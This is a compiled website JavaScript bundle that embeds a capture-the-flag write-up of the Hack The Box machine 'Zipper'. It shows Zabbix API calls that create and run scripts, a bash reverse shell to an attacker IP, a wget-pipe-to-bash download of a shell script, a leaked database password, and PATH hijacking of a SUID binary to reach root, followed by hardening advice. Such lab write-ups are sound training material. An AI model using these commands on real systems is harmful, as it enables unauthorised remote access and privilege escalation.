"use strict";(self["webpackChunkpersonal_website"]=self["webpackChunkpersonal_website"]||[]).push([[388],{8962:function(e,t,o){o.r(t),o.d(t,{default:function(){return O}});var a=o(6768),s=o.p+"img/image_1.2b79907b.png",n=o.p+"img/image_2.aabf458c.png",i=o.p+"img/image_3.bddb8b36.png",r=o.p+"img/image_4.b7da9754.png",p=o.p+"img/image_5.ddc9a796.png",h=o.p+"img/image_6.5315a3b3.png",c=o.p+"img/image_7.513e649d.png",u=o.p+"img/image_8.c655b414.png",l=o.p+"img/image_9.4192bdba.png",d=o.p+"img/image_10.d2d22b77.png",m=o.p+"img/image_11.aa43730a.png",g=o.p+"img/image_12.d4977272.png",b=o.p+"img/image_13.007266a3.png",w=o.p+"img/image_14.be6ca206.png",f=o.p+"img/image_15.3bef0743.png",q=o.p+"img/image_16.189d049d.png",y=o.p+"img/image_17.7bbf6786.png",x=o.p+"img/image_18.3bf5eb62.png",v=o.p+"img/image_19.5b8ce54c.png",z=o.p+"img/image_20.8747caac.png",S=o.p+"img/image_21.8c381c6f.png",k=o.p+"img/image_22.56595e41.png",I=o.p+"img/image_23.3a54c578.png",T=o.p+"img/image_24.4ed429c0.png",_=o.p+"img/image_25.ff7198e2.png",A=o.p+"img/image_26.00cb4937.png",j=o.p+"img/image_27.bb272d85.png";const P={class:"component-writeup"},H=(0,a.Fv)('<h1>Recon</h1><h2>Nmap</h2><pre><code>PORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n10050/tcp open  tcpwrapped\n</code></pre><h1>Initial Foothold (Port 80)</h1><p>Based on the open TCP port 10050, we can assume the server is running the Zabbix service. From the Zabbix documentation (<a href="https://www.zabbix.com/documentation/current/en/manual/installation/frontend">https://www.zabbix.com/documentation/current/en/manual/installation/frontend</a>), we can find that the home directory of the web frontend is /zabbix/</p><p><img src="'+s+'" alt="Screenshots"></p><p>Besides logging in with credentials, there is also an option to login as guest without password. This gives us an initial idea of what zabbix is about.</p><p><img src="'+n+'" alt="Screenshots"></p><p>As expected, the guest account only have read access to items available on the frontend. By checking on “Monitoring” &gt; “Latest data”, it seems that one of the item was named “Zapper’s Backup Script” which suggests that “zapper” is a possible username on the server.</p><p><img src="'+i+'" alt="Screenshots"></p><h2>Checking Writeup and Hints</h2><p>Having a potential username, I attempted to bruteforce the password on Zabbix using my own script. That did not work, and after reading some comments on the HTB forum (without spoilers), attempting to bruteforce with rockyou.txt is definitely overkill.</p><p>Having just a little peak at 0xdf’s writeup (<a href="https://0xdf.gitlab.io/2019/02/23/htb-zipper.html">https://0xdf.gitlab.io/2019/02/23/htb-zipper.html</a>), it turns out that I forgot about trying dumb credential combinations, aka using the username as password. That allowed me to move onto the next step</p><h2>GUI Access</h2><p>Even though we’ve obtained the user credentials, the following prompt was shown informing that GUI access was disabled for this user.</p><p><img src="'+r+'" alt="Screenshots"></p><p>Going back to Zabbix’s documentation, there is an API section which documents on the available endpoints and how to use them (<a href="https://www.zabbix.com/documentation/current/en/manual/api/reference">https://www.zabbix.com/documentation/current/en/manual/api/reference</a>).</p><p>It uses the JSON-RPC 2.0 protocol through the “api_jsonrpc.php” endpoint. First we will need to perform the authentication to obtain a Bearer token. Then the token will be used in the Authorization header for all subsequent API requests.</p><pre><code class="language-bash">curl --request POST --url &#39;http://zipper.htb/zabbix/api_jsonrpc.php&#39; --header &#39;Content-Type: application/json-rpc&#39; --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;: &quot;user.login&quot;, &quot;params&quot;:{&quot;user&quot;: &quot;zapper&quot;, &quot;password&quot;: &quot;zapper&quot;}, &quot;id&quot;:&quot;1&quot;}&#39;\n</code></pre><p><img src="'+p+'" alt="Screenshots"></p><p>Going through the documentation, the first item that caught my eyes is the Script object (<a href="https://www.zabbix.com/documentation/current/en/manual/api/reference/script">https://www.zabbix.com/documentation/current/en/manual/api/reference/script</a>). This suggests that some user accounts (assumably administrators) can run custom scripts on the agents. First we would check if there is any existing commands in place.</p><p>(For some reason I was not able to access the endpoints using the Bearer token in the headers. However, I’ve found on <a href="https://sbcode.net/zabbix/zabbix-api-examples/">https://sbcode.net/zabbix/zabbix-api-examples/</a> that the token can be used in the JSON object with the attribute ‘auth’)</p><pre><code class="language-bash">curl --request POST --url &#39;http://zipper.htb/zabbix/api_jsonrpc.php&#39; --header &#39;Content-Type: application/json-rpc&#39; --data &#39;{&quot;auth&quot;:&quot;3afb55af137e2836bcf73f5a37d4a57a&quot;, &quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;: &quot;script.get&quot;, &quot;params&quot;:{&quot;output&quot;: &quot;extend&quot;}, &quot;id&quot;:&quot;1&quot;}&#39;\n</code></pre><p><img src="'+h+'" alt="Screenshots"> From the results, we can see that Linux commands were used in these scripts. This means that we should be able to perform remote code execution by creating a new script and execute it manually.</p><p>The following bash reverse shell (from <a href="http://revshells.com">revshells.com</a>) will be used.</p><pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.10.14.35/443 0&gt;&amp;1\n</code></pre><p>Since it is a bit annoying to deal with escaping special characters, the reverse shell above was saved as ‘<a href="http://shell.sh">shell.sh</a>’ and hosted on a python http server (port 8888) on the attacker machine.</p><p>With that, I’ve create a new script that retrieves the shellcode and execute it locally. Here we are using wget instead as curl does not exist on the host.</p><pre><code class="language-bash">curl --request POST --url &#39;http://zipper.htb/zabbix/api_jsonrpc.php&#39; --header &#39;Content-Type: application/json-rpc&#39; --data &#39;{&quot;auth&quot;:&quot;3afb55af137e2836bcf73f5a37d4a57a&quot;, &quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;: &quot;script.create&quot;, &quot;params&quot;:{&quot;name&quot;: &quot;test&quot;, &quot;command&quot;:&quot;nohup wget http://10.10.14.35:8888/shell.sh -qO- | bash&quot;, &quot;type&quot;:0, &quot;scope&quot;:2}, &quot;id&quot;:&quot;1&quot;}&#39;\n</code></pre><p><img src="'+c+'" alt="Screenshots"></p><p>The to execute the script, we will need to obtain the hostid first.</p><pre><code class="language-bash">curl --request POST --url &#39;http://zipper.htb/zabbix/api_jsonrpc.php&#39; --header &#39;Content-Type: application/json-rpc&#39; --data &#39;{&quot;auth&quot;:&quot;3afb55af137e2836bcf73f5a37d4a57a&quot;, &quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;: &quot;host.get&quot;, &quot;params&quot;:{&quot;output&quot;: &quot;extend&quot;}, &quot;id&quot;:&quot;1&quot;}&#39;\n</code></pre><p><img src="'+u+'" alt="Screenshots"></p><p>Then we can listen on port 443 and execute the script.</p><pre><code class="language-bash">curl --request POST --url &#39;http://zipper.htb/zabbix/api_jsonrpc.php&#39; --header &#39;Content-Type: application/json-rpc&#39; --data &#39;{&quot;auth&quot;:&quot;3afb55af137e2836bcf73f5a37d4a57a&quot;, &quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;: &quot;script.execute&quot;, &quot;params&quot;:{&quot;hostid&quot;: &quot;10105&quot;, &quot;scriptid&quot;: &quot;4&quot;}, &quot;id&quot;:&quot;1&quot;}&#39;\n</code></pre><p><img src="'+l+'" alt="Screenshots"></p><p>Note that in the script that we created, the “nohup” or “disown” commands were used. This is because the script will timeout after 60 seconds if there is no response from the command.</p><p><img src="'+d+'" alt="Screenshots"></p><p>This means that a SIGHUP signal is sent to the process and its subprocesses, which then terminates the job. Using nohup or disown will protect the process from the SIGHUP signal and thus allow the reverse shell to remain intact after 60 seconds. (<a href="https://www.baeldung.com/linux/job-control-disown-nohup">https://www.baeldung.com/linux/job-control-disown-nohup</a>)</p><h1>User.txt</h1><p>While enumerating the host, we can see that we are accessing a docker container based on the /.dockerenv file. So the initial thought was to find ways to break out of the container. However that lead to nowhere. I can also see there is a /backups directory with some password-protected 7zip archives. I’ve attempted to crack them but no luck either.</p><p>As observed that there are 2 hosts connected, I’ve tried to execute the same script with the other host id (10106). Surprisingly I still ended up in the same place which seems a bit weird.</p><p>Looking further in to the zabbix directory (/usr/share/zabbix), I’ve located the zabbix.conf.php file which is used for the database conenction.</p><p><img src="'+m+'" alt="Screenshots"></p><p>The file contains the database name, username and password for connecting to the database.</p><p><img src="'+g+'" alt="Screenshots"></p><p>And so I’ve connected to the database.</p><pre><code class="language-bash">mysql -h 127.0.0.1 -u zabbix -p&#39;f.YMeMd$pTbpY3-449&#39;\n</code></pre><p>However, for some reason the outputs of subsequent commands in the mysql shell does not show in stdout until an error is triggered. Nevertheless, I’ve attempted to crack the Admin hash but also resulted in nothing.</p><p>Here I suddenly realize that I can just grant the zapper account GUI access by modifying the database. So I’ve used the following SQL update query to grant all users GUI access to Zabbix.</p><p>(And after solving the box, I also realize that I can actually do this through the API.)</p><pre><code class="language-sql">use zabbixdb;\nupdate usrgrp set gui_access = 1;\n</code></pre><p><img src="'+b+'" alt="Screenshots"></p><p><img src="'+w+'" alt="Screenshots"></p><p>This allows me to have a better look at the Scripts functionality. Looking in to the fields, I realized that you can choose to execute on the Zabbix agent or the Zabbix server. The script that we created through the API is currently executing on the server.</p><p><img src="'+f+'" alt="Screenshots"></p><p>Since the Zipper host should be our target (which is an agent), changing the “Execute on” field to “Zabbix agent” should allow us to execute code from there. Note that the hostid should be changed to 10106.</p><p>When executing the original <a href="http://shell.sh">shell.sh</a>, the shell died as soon as the connection was established. From the API response, it seems that the command simply returned successful thus killing the reverse shell process.</p><p><img src="'+q+'" alt="Screenshots"> Therefore, the <a href="http://shell.sh">shell.sh</a> is modified as below.</p><pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.10.14.35/443 0&gt;&amp;1\n</code></pre><p>Now we have shell access to the Zipper host.</p><p><img src="'+y+'" alt="Screenshots"></p><p>After some enumeration on the host, some interesting files were found in the /home/zapper/utils/ directory.</p><p><img src="'+x+'" alt="Screenshots"></p><p>First looking at the <a href="http://backup.sh">backup.sh</a> file, it contained a password used to encrypt the 7zip archive we observed earlier.</p><p><img src="'+v+'" alt="Screenshots"></p><p>And by using the password we can actually switch to the user zapper using su (need to spawn a tty shell first).</p><p><img src="'+z+'" alt="Screenshots"></p><h1>Root.txt</h1><p>In the same /home/zapper/utils/ directory, we can see another ELF file “zabbix-service” with the SUID bit set. Some googling was done on the name of this binary, but no result was found about it. So this is probably a custom-built binary.</p><p>First we’ll use ltrace to see what the binary is doing.</p><p><img src="'+S+'" alt="Screenshots"></p><p>It simply asked for the user to input either “start” or “stop”. We will try entering “start” first.</p><p><img src="'+k+'" alt="Screenshots"></p><p>Note that it executed the “systemctl” command. Now if we choose “stop” instead. <img src="'+I+'" alt="Screenshots"></p><p>It still executed “systemctl” with different arguments. Since it’s using a relative path, we can hijack the script by modifying our PATH environment variable to include our custom binary and rename it to “systemctl”.</p><p>I’ve decided to abuse the “start” option. Here I simply copied “/bin/bash” to “/home/zapper/systemctl” and created a file named “daemon-reload” with a simple “bash” command. Then the /home/zapper directory is added to the PATH environment variable.</p><pre><code class="language-bash">cp /bin/bash /home/zapper/systemctl\necho &quot;bash&quot; &gt; /home/zapper/daemon-reload\nexport PATH=/home/zapper:$PATH\n</code></pre><p>With that, now we execute the “zabbix-service” binary again with the “start” option. And we have a bash shell as root.</p><p><img src="'+T+'" alt="Screenshots"></p><h1>Extra</h1><h2>zabbix-service source code</h2><p>The source code of the zabbix-service can be found in /root/scripts/zabbix-service.c, although we’ve pretty much get the idea of how the binary works.</p><p><img src="'+_+'" alt="Screenshots"></p><h2>Blocking Code Execution on Agent</h2><p>Based on this documentation page (<a href="https://www.zabbix.com/documentation/current/en/manual/config/items/restrict_checks">https://www.zabbix.com/documentation/current/en/manual/config/items/restrict_checks</a>), there are 2 ways to block code execution based on agent versions. Both methods require modification to be done on the agent’s configuration file (/etc/zabbix/zabbix_agentd.conf).</p><p>For agent version &lt;5.0.2, we’ll need to modify the configuration file to the following. And this is what we can do with the agent configuration on Zipper.</p><pre><code>EnableRemoteCommand=0\n</code></pre><p><img src="'+A+'" alt="Screenshots"></p><p>This will block any remote commands from executing on the agent. <img src="'+j+'" alt="Screenshots"></p><p>For agent version &gt;=5.0.2 (including agent and agent2), this can be done by using a whitelist approach. The agent can determine what commands are allowed and denied based on the “AllowKey” and “DenyKey” in the configuration file. An example can be found on the same documentation page.</p><pre><code># Example\n\n# Allow listing files in / with ls\nAllowKey=system.run[ls -l /]\n\n# Deny all other keys\nDenyKey=*\n</code></pre><h1>Lessons Learned</h1><h2>Credential Testing Methodology</h2><p>This box allowed me to review my methodology on testing user credentials. More specifically, on what combinations should I manually test before moving on with bruteforcing scripts or tools. I should keep in mind that any credential combination is possible, no matter how simple or obvious it may look.</p><h2>Reading documentation</h2><p>The Zabbix service has detailed documentation from its basic components to advanced configurations available. While that is a lot of pages to go through, I’ve learned to try and narrow down to only those that could potentially be abused (e.g. script execution) or those that I need at the moment (e.g. authentication token). This way I can go through documentations a bit more efficiently without digging in too deep into rabbit holes.</p>',97),C=[H];function F(e,t){return(0,a.uX)(),(0,a.CE)("div",P,C)}var Z=o(1241);const E={},U=(0,Z.A)(E,[["render",F]]);var O=U}}]);
//# sourceMappingURL=388.32cfc782.js.map